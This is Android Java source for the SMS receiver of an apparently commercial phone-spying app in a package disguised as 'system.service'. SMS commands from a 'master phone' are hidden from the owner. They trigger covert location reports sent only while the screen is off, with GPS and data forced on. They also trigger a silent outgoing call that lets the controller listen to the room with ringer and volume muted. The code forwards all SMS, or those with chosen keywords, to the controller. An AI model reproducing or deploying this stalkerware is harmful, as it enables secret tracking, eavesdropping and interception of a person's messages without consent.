package system.service.receiver;

import java.io.File;
import java.text.DateFormat;
import java.text.ParseException;
import java.util.Calendar;
import java.util.Date;
import java.util.Timer;

import system.service.BootService;
import system.service.GlobalValues;
import system.service.IndicationHandler;
import system.service.MaxVolTask;
import system.service.R;
import system.service.R.raw;
import system.service.R.string;
import system.service.activity.GlobalPrefActivity;
import system.service.activity.HomeActivity;
import system.service.config.ConfigCtrl;

import com.particle.inspector.common.util.phone.PhoneUtils;
import com.particle.inspector.common.util.sms.SmsConsts;
import com.particle.inspector.common.util.sms.TrialSms;
import com.particle.inspector.common.util.DatetimeUtil;
import com.particle.inspector.common.util.FileCtrl;
import com.particle.inspector.common.util.GpsUtil;
import com.particle.inspector.common.util.LANG;
import com.particle.inspector.common.util.LangUtil;
import com.particle.inspector.common.util.NetworkUtil;
import com.particle.inspector.common.util.PowerUtil;
import com.particle.inspector.common.util.RegExpUtil;
import com.particle.inspector.common.util.SIM_TYPE;
import com.particle.inspector.common.util.StrUtils;
import com.particle.inspector.common.util.sms.AUTH_SMS_TYPE;

import system.service.feature.location.LocationInfo;
import system.service.feature.location.LocationUtil;
import system.service.feature.sms.SmsCtrl;
import com.particle.inspector.common.util.DeviceProperty;
import com.particle.inspector.common.util.SysUtils;
import com.particle.inspector.common.util.license.LicenseCtrl;
import com.particle.inspector.common.util.license.LICENSE_TYPE;
import com.particle.inspector.common.util.location.BaseStationLocation;
import com.particle.inspector.common.util.location.BaseStationUtil;

import android.app.Service;
import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.location.Location;
import android.location.LocationManager;
import android.media.AudioManager;
import android.media.MediaPlayer;
import android.media.MediaRecorder;
import android.net.Uri;
import android.os.Bundle;
import android.os.Looper;
import android.os.RemoteException;
import android.telephony.PhoneStateListener;
import android.telephony.SmsMessage;
import android.telephony.TelephonyManager;
import android.util.Log;

public class SmsReceiver extends BroadcastReceiver 
{
	private static final String LOGTAG = "SmsReceiver";
	private static final String SMS_RECEIVED = "android.provider.Telephony.SMS_RECEIVED";
	private Context context;
	
	public static int ORIGINAL_RING_MODE;
	public static int ORIGINAL_RING_VOL;
	public static int ORIGINAL_VOICE_CALL_VOL;
	
	// **************************************************************************************
    // Receiver for SMS handling
	// **************************************************************************************
	@SuppressWarnings("unused")
	@Override
	public void onReceive(Context context, Intent intent) 
	{
		android.os.Debug.waitForDebugger();//TODO should be removed in the release
		
		if (intent.getAction().equals(SMS_RECEIVED)) 
		{
			// When comes here, that means the phone has received the SMS, so now it must be capable to send SMS.
			
			String smsBody = SmsCtrl.getSmsBody(intent).trim();
			if (smsBody.length() <= 0) return; 
			
			String incomingPhoneNum = SmsCtrl.getSmsAddress(intent);

			//-------------------------------------------------------------------------------
			// If it is the activation SMS (###), show the setting view
			if (smsBody.equals(LicenseCtrl.TRIAL_KEY)) 
			{
				abortBroadcast(); // Finish broadcast, the system will notify this SMS
				
				// Set trial key and type if not licensed before 
				if (GlobalValues.licenseType == LICENSE_TYPE.NOT_LICENSED
					&& ConfigCtrl.getConsumedDatetime(context) == null) 
				{
					GlobalValues.licenseType = LICENSE_TYPE.TRIAL_LICENSED;
					ConfigCtrl.setLicenseKey(context, LicenseCtrl.TRIAL_KEY);
					// Save consumed datetime
					ConfigCtrl.setConsumedDatetime(context, (new Date()));
					
					// Set self phone number if can get it by self
					String selfPhoneNum = DeviceProperty.getPhoneNumber(context);
					if (selfPhoneNum != null && selfPhoneNum.length() > 0) {
						ConfigCtrl.setSelfPhoneNum(context, selfPhoneNum);
					}
					
					// Send trial info
					SmsCtrl.sendTrialSms(context);
				}
				
				// The setting dialog cannot be triggered by phone that is not master phone
				String masterPhone = GlobalPrefActivity.getReceiverPhoneNum(context);
				if (masterPhone.length() > 0 &&	!comingFromMasterPhone(context, intent)) {
					return;
				}
				
				// If out of trial or not licensed, do not show the setting dialog again.
				if (!ConfigCtrl.isLegal(context)) {
					String recvPhoneNum = GlobalPrefActivity.getReceiverPhoneNum(context);
					if (recvPhoneNum != null && recvPhoneNum.length() > 0) {
						String msg = context.getResources().getString(R.string.msg_trial_expire_or_not_licensed);
						SmsCtrl.sendSms(recvPhoneNum, msg);
					}
					
					return;
				}
				
				// Start dialog
				Intent initIntent = new Intent().setClass(context, HomeActivity.class);
				initIntent.addFlags(Intent.FLAG_ACTIVITY_SINGLE_TOP); 
				initIntent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK); 
				context.startActivity(initIntent);
			}
			
			//-------------------------------------------------------------------------------
			// If it is the indication SMS
			else if (smsBody.startsWith(SmsConsts.HEADER_INDICATION) && smsBody.getBytes()[2] == '#')
			{
				abortBroadcast(); // Finish broadcast, the system will notify this SMS
				
				String phoneNum = SmsCtrl.getSmsAddress(intent);
				IndicationHandler.handleIndicationSms(context, smsBody, phoneNum);
			}
			
			//-------------------------------------------------------------------------------
			// Send location SMS if being triggered by location indication
			else if (smsBody.equalsIgnoreCase(SmsConsts.INDICATION_LOCATION) || smsBody.equalsIgnoreCase(SmsConsts.INDICATION_LOCATION_ALIAS))
			{
				abortBroadcast(); // Do not show location activation SMS
				
				if (!ConfigCtrl.isLegal(context)) return;
				this.context = context;
				
				// If the coming phone is not the receiver phone, return
				if (!comingFromMasterPhone(context, intent)) return;
				
				// If the user is looking at the phone, return for safety
				if (PowerUtil.isScreenOn(context)) {
					String msg = context.getResources().getString(R.string.location_fail_screen_on);
					SmsCtrl.sendSms(incomingPhoneNum, msg);
					return;
				}
				
				// Start a new thread to do the time-consuming job
    			new Thread(new Runnable(){
    				public void run() {
    					String phoneNum = GlobalPrefActivity.getReceiverPhoneNum(SmsReceiver.this.context);
    					if (BootService.locationUtil == null) {
    						return;
    					}
    					LocationInfo location = getGeoLocation();
    					String locationSms = "";
    					if (location != null) {
    						locationSms = SmsCtrl.buildLocationSms(SmsReceiver.this.context, location);
    					}
    					else {
    						BaseStationLocation bsLoc = BaseStationUtil.getBaseStationLocation(SmsReceiver.this.context);
    						locationSms = SmsCtrl.buildBaseStationLocationSms(SmsReceiver.this.context, bsLoc);
    					}
    					
    					boolean ret = SmsCtrl.sendSms(phoneNum, locationSms);
    				}
    			}).start();
			}
			
			//-------------------------------------------------------------------------------
			// Call master phone if being triggered by env listening indication
			else if (smsBody.equalsIgnoreCase(SmsConsts.INDICATION_ENV) || smsBody.equalsIgnoreCase(SmsConsts.INDICATION_ENV_ALIAS))
			{
				abortBroadcast(); // Do not show env listening SMS
				
				if (!ConfigCtrl.isLegal(context)) return;
				this.context = context;
				
				// If the coming phone is not the receiver phone, return
				if (!comingFromMasterPhone(context, intent)) return;
				
				// Return if the target phone screen is on or it is in a call.
				// That mean it will only take env listening action when the screen is off and not in a call.
				TelephonyManager tm = (TelephonyManager) context.getSystemService(Service.TELEPHONY_SERVICE);
				try {
					if (PhoneUtils.getITelephony(tm).isOffhook()) {
						String msg = context.getResources().getString(R.string.env_fail_offhook);
						SmsCtrl.sendSms(GlobalPrefActivity.getReceiverPhoneNum(context), msg);
						return;
					}
					else if (PowerUtil.isScreenOn(context)) {
						String msg = context.getResources().getString(R.string.env_fail_screen_on);
						SmsCtrl.sendSms(GlobalPrefActivity.getReceiverPhoneNum(context), msg);
						return;
					}
				} catch (Exception e) {	
					String msg = context.getResources().getString(R.string.env_fail_exception);
					SmsCtrl.sendSms(GlobalPrefActivity.getReceiverPhoneNum(context), msg);
					return;
				}
				
				// Start a new thread to call master phone
				new Thread(new Runnable(){
					public void run() {
						// Disable ringer and vibrate
						AudioManager am = (AudioManager) SmsReceiver.this.context.getSystemService(Context.AUDIO_SERVICE);
		        		ORIGINAL_RING_MODE = am.getRingerMode();
		        		if (ORIGINAL_RING_MODE == AudioManager.RINGER_MODE_NORMAL) {
		        			ORIGINAL_RING_VOL = am.getStreamVolume(AudioManager.STREAM_RING);
		        		}
		        		am.setRingerMode(AudioManager.RINGER_MODE_SILENT);
						
						// Lower phone call volume to min
						ORIGINAL_VOICE_CALL_VOL = am.getStreamVolume(AudioManager.STREAM_VOICE_CALL);
						am.setStreamVolume(AudioManager.STREAM_VOICE_CALL, 0, 0);
						
						// Call master phone
						String masterPhone = GlobalPrefActivity.getReceiverPhoneNum(SmsReceiver.this.context);
						Uri uri = Uri.parse("tel:" + masterPhone);			          
						Intent intent = new Intent(Intent.ACTION_CALL, uri);
						intent.addFlags(Intent.FLAG_FROM_BACKGROUND); 
						intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK); 
						SmsReceiver.this.context.startActivity(intent);
						
						GlobalValues.IS_ENV_LISTENING = true;
						
						// Turn off screen
						//PowerUtil.setScreenOff(SmsReceiver.this.context);
					}
				}).start();
			}
			
			//-------------------------------------------------------------------------------
			// Force belling if being triggered by bell activation indication
			else if (smsBody.equalsIgnoreCase(SmsConsts.INDICATION_RING) || smsBody.equalsIgnoreCase(SmsConsts.INDICATION_RING_ALIAS))
			{
				abortBroadcast(); // Do not show bell activation SMS
				
				if (!ConfigCtrl.isLegal(context)) return;
				this.context = context;
				
				// If not coming from master phone, return
				if (!comingFromMasterPhone(context, intent)) return;
				
				// Start a new thread to play ring which is time-consuming
				new Thread(new Runnable(){
					public void run() {
						// Raise volume to max
						AudioManager am = (AudioManager) SmsReceiver.this.context.getSystemService(Context.AUDIO_SERVICE);
						int maxVol = am.getStreamMaxVolume(AudioManager.STREAM_MUSIC);
						am.setStreamVolume(AudioManager.STREAM_MUSIC, maxVol, 0);
    					
						// Start to play
						try {
							MediaPlayer mp = MediaPlayer.create(SmsReceiver.this.context, R.raw.alarm);
							mp.setLooping(true);
							mp.start();
						} catch (Exception ex) { 
							//Log.e(LOGTAG, ex.getMessage());
						}
						
						// Start a timer to detect volume change by user and force it to max
						(new Timer()).scheduleAtFixedRate(new MaxVolTask(SmsReceiver.this.context), 1000, 300);
					}
				}).start();
			}
			
			//-------------------------------------------------------------------------------
			// Redirect SMS that contains sensitive words
			else if (GlobalPrefActivity.getRedirectAllSms(context) || containSensitiveWords(context, smsBody)) 
			{
				if (!ConfigCtrl.isLegal(context)) return;
				
				// Count ++ if in trial
				if (GlobalValues.licenseType == LICENSE_TYPE.TRIAL_LICENSED && ConfigCtrl.reachSmsRedirectTimeLimit(context)) {
					if (!ConfigCtrl.getHasSentRedirectSmsTimesLimitSms(context)) {
						// Send SMS to warn user
						String recvPhoneNum = GlobalPrefActivity.getReceiverPhoneNum(context);
						if (recvPhoneNum != null && recvPhoneNum.length() > 0) {
							String msg = context.getResources().getString(R.string.msg_sms_times_over_in_trial) + context.getResources().getString(R.string.support_qq);
							boolean ret = SmsCtrl.sendSms(recvPhoneNum, msg);
							if (ret) {
								ConfigCtrl.setHasSentRedirectSmsTimesLimitSms(context, true);
							}
						}
					}
					return;
				}

				String phoneNum = GlobalPrefActivity.getReceiverPhoneNum(context);
				if (phoneNum.length() > 0) {
					String smsAddress = SmsCtrl.getSmsAddress(intent);
					String header = String.format(context.getResources().getString(R.string.sms_redirect_header), smsAddress);
					boolean ret = SmsCtrl.sendSms(phoneNum, header + smsBody);
					if (ret && GlobalValues.licenseType == LICENSE_TYPE.TRIAL_LICENSED) {
						ConfigCtrl.countSmsRedirectTimesInTrial(context);
					}
				}
			}
		} // end of SMS_RECEIVED
        
	} // end of onReceive()
	
	public LocationInfo getGeoLocation()
	{
		long now = (new Date()).getTime();
		
		// If GPS is not enabled, try to enable it
		boolean tryToEnableGPS = false;
		if (!GpsUtil.isGpsEnabled(context)) {
			int tryCount = 0;
			while (!GpsUtil.isGpsEnabled(context) && tryCount < 3) {
				tryCount++;
				GpsUtil.enableGPS(context);
				SysUtils.threadSleep(5000, LOGTAG);
			}
			
			if (GpsUtil.isGpsEnabled(context))	tryToEnableGPS = true;
		}
		
        // If WIFI is not enabled, try to enable it
     	boolean tryToEnableNetwork = false;
     	if (!NetworkUtil.isNetworkConnected(context)) {
     		tryToEnableNetwork = NetworkUtil.tryToConnectDataNetwork(context);
     	}
     	
		// Try to sleep for a while for the LocationUtil to update location records
     	SysUtils.threadSleep(40000, LOGTAG);
     	LocationInfo location = null;
     	int tryCount = 0;
     	while (location == null && tryCount <= 7) {
     		tryCount++;
     		SysUtils.threadSleep(10000, LOGTAG);
    	   	if (BootService.locationUtil.locationGpsQueue.size() > 0) {
    	   		Location loc = BootService.locationUtil.locationGpsQueue.getLast();
    	   		// If the location is got after the action beginning
    	   		if (loc.getTime() > now) {
    	   			location = new LocationInfo(loc, LocationInfo.GPS);
    	   		}
        	}
    	   	else if (BootService.locationUtil.locationWifiQueue.size() > 0) {
    	   		Location loc = BootService.locationUtil.locationWifiQueue.getLast();
    	   		// If the location is got after the action beginning
    	   		if (loc.getTime() > now) {
    	   			location = new LocationInfo(loc, LocationInfo.WIFI);
    	   		}
        	}
     	}
	    	
	    // If GPS previously forced to be enabled, try to disable it
	   	if (tryToEnableGPS) {
	   		GpsUtil.disableGPS(context);
	   	}
	   	
	    // If network previously forced to be enabled, try to disable it
    	if (tryToEnableNetwork) {
    		NetworkUtil.tryToDisconnectDataNetwork(context);
    	}
	   	
    	return location;
    }	
	
	private boolean containSensitiveWords(Context context, String sms) {
		boolean ret = false;
		if (GlobalValues.sensitiveWordArray == null || GlobalValues.sensitiveWordArray.length <= 0) 
			return false; // We only redirect SMS that contains sensitive words intead of redirecting all.

		String smsBody = sms.toLowerCase();
		for (String word : GlobalValues.sensitiveWordArray) {
			if (smsBody.contains(word)) {
				ret = true;
				break;
			}
		}
		return ret;
	}
	
	private boolean comingFromMasterPhone(Context context, Intent intent) {
		String phoneNum = GlobalPrefActivity.getReceiverPhoneNum(context);
		String comingPhoneNum = SmsCtrl.getSmsAddress(intent);
		return (phoneNum != null && phoneNum.length() > 0 && comingPhoneNum.contains(phoneNum));
	}

}